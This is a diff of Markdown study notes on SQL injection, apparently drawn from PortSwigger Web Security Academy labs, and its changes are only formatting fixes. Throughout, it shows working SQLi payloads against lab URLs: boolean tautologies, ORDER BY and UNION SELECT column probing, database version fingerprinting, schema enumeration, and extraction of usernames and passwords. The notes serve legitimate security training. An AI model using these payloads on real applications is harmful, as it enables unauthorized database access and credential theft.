@@ -1,6 +1,6 @@
 # SQL Injection
 
-## SQL injection \(SQLi\) Information
+## SQL injection (SQLi) Information
 
 SQL injection is a web security flaw that allows an attacker to interfere with a web application's database queries. It allows an attacker to see data that they wouldn't ordinarily be able to see. This could include data belonging to other users or any other information that the app has access to. In many circumstances, an attacker can change or remove this information.
 
@@ -10,7 +10,7 @@ A successful SQL injection attack can result in unauthorized access to sensitive
 
 ### Reference
 
-Most of the notes that are here and the exercises \(labs\) are from portswigger academy:
+Most of the notes that are here and the exercises (labs) are from portswigger academy:
 
 {% embed url="https://portswigger.net/" %}
 
@@ -28,7 +28,7 @@ This causes the application to make an SQL query to retrieve details of the rele
 
 This SQL query asks the database to return:
 
-* all details \(\*\)
+* all details (\*)
 * from the products table
 * where the category is Gifts
 * and released is 1.
@@ -57,7 +57,7 @@ The modified query will return all items where either the category is Gifts, or 
 
 **Example of an SQL injection vulnerability in WHERE clause allowing retrieval of hidden data:**
 
-```text
+```
 # URL Decoded
 https://acff1f681f6a7a908082055100d30020.web-security-academy.net/filter?category=Gifts' or 1=1--
 
@@ -127,10 +127,10 @@ When performing an SQL injection UNION attack, there are two effective methods t
 
 The first method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, assuming the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
 
-`' ORDER BY 1--    
-' ORDER BY 2--    
-' ORDER BY 3--    
-etc.`
+`' ORDER BY 1--  `\
+`' ORDER BY 2--  `\
+`' ORDER BY 3--  `\
+`etc.`
 
 This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:
 
@@ -140,10 +140,10 @@ The application might actually return the database error in its HTTP response, o
 
 The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:
 
-`' UNION SELECT NULL--    
-' UNION SELECT NULL,NULL--    
-' UNION SELECT NULL,NULL,NULL--    
-etc.`
+`' UNION SELECT NULL--  `\
+`' UNION SELECT NULL,NULL--  `\
+`' UNION SELECT NULL,NULL,NULL--  `\
+`etc.`
 
 If the number of nulls does not match the number of columns, the database returns an error, such as:
 
@@ -163,7 +163,7 @@ For more details of database-specific syntax, see the [SQL injection cheat sheet
 
 First, determine the number of columns:
 
-```text
+```
 # URL Decoded
 https://acba1f401ebdddba804a0eaa00610008.web-security-academy.net/filter?category=' ORDER BY 3--
 
@@ -173,7 +173,7 @@ https://acba1f401ebdddba804a0eaa00610008.web-security-academy.net/filter?categor
 
 Then try performing a `UNION` statement with the number of columns found, use `NULL` since we don't know the names of the columns:
 
-```text
+```
 # URL Decoded
 https://acba1f401ebdddba804a0eaa00610008.web-security-academy.net/filter?category=' UNION SELECT NULL,NULL,NULL--
 
@@ -187,10 +187,10 @@ The reason for performing an SQL injection UNION attack is to be able to retriev
 
 Having already determined the number of required columns, you can probe each column to test whether it can hold string data by submitting a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
 
-`' UNION SELECT 'a',NULL,NULL,NULL--    
-' UNION SELECT NULL,'a',NULL,NULL--    
-' UNION SELECT NULL,NULL,'a',NULL--    
-' UNION SELECT NULL,NULL,NULL,'a'--`
+`' UNION SELECT 'a',NULL,NULL,NULL--  `\
+`' UNION SELECT NULL,'a',NULL,NULL--  `\
+`' UNION SELECT NULL,NULL,'a',NULL--  `\
+`' UNION SELECT NULL,NULL,NULL,'a'--`
 
 If the data type of a column is not compatible with string data, the injected query will cause a database error, such as:
 
@@ -200,7 +200,7 @@ If an error does not occur, and the application's response contains some additio
 
 **Example of an SQL injection UNION attack, finding a column containing text:**
 
-```text
+```
 # URL Decoded
 https://ac781f491ed3707f804b165000740086.web-security-academy.net/filter?category=' UNION SELECT NULL,'8ImmxI',NULL--
 
@@ -226,21 +226,21 @@ Of course, the crucial information needed to perform this attack is that there i
 
 **Example of an SQL injection UNION attack, retrieving data from other tables:**
 
-```text
+```
 ' ORDER BY 1--
 ' ORDER BY 2--
 ```
 
-```text
+```
 ' UNION SELECT NULL,NULL--
 ```
 
-```text
+```
 ' UNION SELECT 'a',NULL--
 ' UNION SELECT 'a','a'--
 ```
 
-```text
+```
 # URL Decoded
 https://ace31fee1e10642480a40baa001600bf.web-security-academy.net/filter?category='UNION SELECT username, password FROM users--
 
@@ -281,14 +281,14 @@ For example, you could use a `UNION` attack with the following input:
 
 This might return output like the following, confirming that the database is Microsoft SQL Server, and the version that is being used:
 
-`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)    
-Mar 18 2018 09:11:49    
-Copyright (c) Microsoft Corporation    
-Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`
+`Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)  `\
+`Mar 18 2018 09:11:49  `\
+`Copyright (c) Microsoft Corporation  `\
+`Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)`
 
 **Example of an SQL injection attack, querying the database type and version on Oracle:**
 
-```text
+```
 # URL Decoded
 https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?category=' UNION SELECT NULL,NULL FROM DUAL--
 
@@ -296,7 +296,7 @@ https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?categor
 https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20NULL,NULL%20FROM%20DUAL--
 ```
 
-```text
+```
 # URL Decoded
 https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?category=' UNION SELECT 'a','a' FROM DUAL--
 
@@ -304,7 +304,7 @@ https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?categor
 https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?category=%27%20UNION%20SELECT%20%27a%27,%27a%27%20FROM%20DUAL--
 ```
 
-```text
+```
 # URL Decoded
 https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?category=' UNION SELECT banner,NULL FROM v$version--
 
@@ -324,7 +324,7 @@ https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?categor
 
 **Research why it doesn't work without a proxy**
 
-```text
+```
 # URL Decoded
 /filter?category=' UNION SELECT 'a','b'# 
 
@@ -332,7 +332,7 @@ https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?categor
 /filter?category='+UNION+SELECT+'a','b'#
 ```
 
-```text
+```
 # URL Decoded
 /filter?category=' UNION SELECT @@version, NULL#
 /filter?category=' UNION SELECT NULL,@@version# 
@@ -345,7 +345,7 @@ https://ac121f401ffb8cc8808a01d60020002b.web-security-academy.net/filter?categor
 
 ### Listing the contents of the database
 
-Most database types \(with the notable exception of Oracle\) have a set of views called the information schema which provides information about the database.
+Most database types (with the notable exception of Oracle) have a set of views called the information schema which provides information about the database.
 
 You can query `information_schema.tables` to list the tables in the database:
 
@@ -355,8 +355,8 @@ This returns output like the following:
 
 ## TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME TABLE\_TYPE
 
-MyDatabase dbo Products BASE TABLE  
-MyDatabase dbo Users BASE TABLE  
+MyDatabase dbo Products BASE TABLE\
+MyDatabase dbo Users BASE TABLE\
 MyDatabase dbo Feedback BASE TABLE\`
 
 This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
@@ -369,15 +369,15 @@ This returns output like the following:
 
 ## TABLE\_CATALOG TABLE\_SCHEMA TABLE\_NAME COLUMN\_NAME DATA\_TYPE
 
-MyDatabase dbo Users UserId int  
-MyDatabase dbo Users Username varchar  
+MyDatabase dbo Users UserId int\
+MyDatabase dbo Users Username varchar\
 MyDatabase dbo Users Password varchar\`
 
 This output shows the columns in the specified table and the data type of each column.
 
 ### SQL injection attack, listing the database contents on non-Oracle databases
 
-```text
+```
 # URL Decoded
 https://ac051f311f52f43a801c355e00500006.web-security-academy.net/filter?category=' ORDER BY 2--
 
@@ -385,7 +385,7 @@ https://ac051f311f52f43a801c355e00500006.web-security-academy.net/filter?categor
 https://ac051f311f52f43a801c355e00500006.web-security-academy.net/filter?category=%27%20ORDER%20BY%202--
 ```
 
-```text
+```
 # URL Decoded
 
 
@@ -394,7 +394,7 @@ https://ac051f311f52f43a801c355e00500006.web-security-academy.net/filter?categor
 https://ac051f311f52f43a801c355e00500006.web-security-academy.net/filter?category=%27UNION%20SELECT%20NULL,NULL--
 ```
 
-```text
+```
 # URL Decoded
 
 
@@ -555,4 +555,3 @@ Comments to finalize the consultations:
 > anD 1=1//
 > anD 1=1;//
 > ```
-
